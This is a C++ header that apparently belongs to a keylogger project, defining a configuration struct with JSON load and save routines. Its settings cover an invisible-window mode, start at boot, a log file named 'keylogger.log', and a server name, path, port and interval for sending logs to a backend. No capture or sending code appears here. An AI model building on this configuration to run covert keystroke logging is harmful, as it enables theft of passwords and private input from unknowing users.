#pragma once
#include <string>
#include <json.hpp>
#include <fstream>
#include <filesystem>

struct Config {
    int format = 0; // 0 = labels, 10 = decimal, 16 = hex
    bool visible = true; // true = VISIBLE, false = INVISIBLE
    bool boot_wait = true; // true = BOOT_WAIT, false = NOWAIT
    bool mouse_ignore = true; // true = ignore mouse clicks
    std::string serverName = "localhost";
    std::string resource = "/";
    int intervalMinutes = 1;  // Minutes
    std::string log_file_name = "keylogger.log";
    int backend_port = 8000;

    void updateFromJson(const nlohmann::json& j) {
        if (j.contains("format")) format = j["format"];
        if (j.contains("visible")) visible = j["visible"];
        if (j.contains("boot_wait")) boot_wait = j["boot_wait"];
        if (j.contains("mouse_ignore")) mouse_ignore = j["mouse_ignore"];
        if (j.contains("serverName")) serverName = j["serverName"];
        if (j.contains("resource")) resource = j["resource"];
        if (j.contains("intervalMinutes")) intervalMinutes = j["intervalMinutes"];
        if (j.contains("log_file_name")) log_file_name = j["log_file_name"];
        if (j.contains("backend_port")) backend_port = j["backend_port"];
    }

    void saveToFile(const std::string& path) const {
        nlohmann::json j;
        j["format"] = format;
        j["visible"] = visible;
        j["boot_wait"] = boot_wait;
        j["mouse_ignore"] = mouse_ignore;
        j["serverName"] = serverName;
        j["resource"] = resource;
        j["intervalMinutes"] = intervalMinutes;
        j["log_file_name"] = log_file_name;
        j["backend_port"] = backend_port;
        std::ofstream ofs(path);
        ofs << j.dump(4);
    }
    bool loadFromFile(const std::string& path) {
        std::ifstream ifs(path);
        if (!ifs) return false;
        nlohmann::json j;
        ifs >> j;
        updateFromJson(j);
        return true;
    }
    static std::string getStateFilePath() {
        std::filesystem::path exePath = std::filesystem::current_path();
        return (exePath / "keylogger_state.json").string();
    }
}; 